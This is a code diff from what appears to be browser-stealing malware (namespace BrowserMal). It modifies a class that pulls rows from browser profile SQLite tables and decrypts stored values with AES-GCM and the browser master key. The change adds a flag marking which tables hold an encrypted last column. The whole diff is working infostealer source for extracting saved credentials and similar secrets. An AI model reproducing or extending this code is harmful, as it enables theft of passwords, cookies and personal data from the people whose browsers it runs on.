@@ -15,10 +15,13 @@ namespace BrowserMal.Manager
         //private static Dictionary<string, List<T>> genericList;
         private readonly string tableName;
         private readonly string[] columnNames;
-        public GenericManager(string tableName, string[] columnNames)
+        private readonly bool lastArgEncrypted;
+
+        public GenericManager(string tableName, string[] columnNames, bool lastArgEncrypted)
         {
             this.tableName = tableName;
             this.columnNames = columnNames;
+            this.lastArgEncrypted = lastArgEncrypted;
         }
 
         public void Init(ref List<BrowserModel> browsers, string profileType)
@@ -76,7 +79,7 @@ namespace BrowserMal.Manager
                 {
                     string[] values = GrabSqliteValues(columnNames, ref sqLiteHandler, i, masterKey);
 
-                    if (string.IsNullOrEmpty(values.Last()))
+                    if (string.IsNullOrEmpty(values.Last()) && lastArgEncrypted)
                         continue;
 
                     T obj = CreateInstanceOfType(values);
@@ -96,7 +99,7 @@ namespace BrowserMal.Manager
             for (int i = 0; i < columns.Length; i++)
             {
                 // last value
-                if (i == columnNames.Length - 1)
+                if (i == columnNames.Length - 1 && lastArgEncrypted)
                 {
                     values[i] = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i]), masterKey);
                     break;
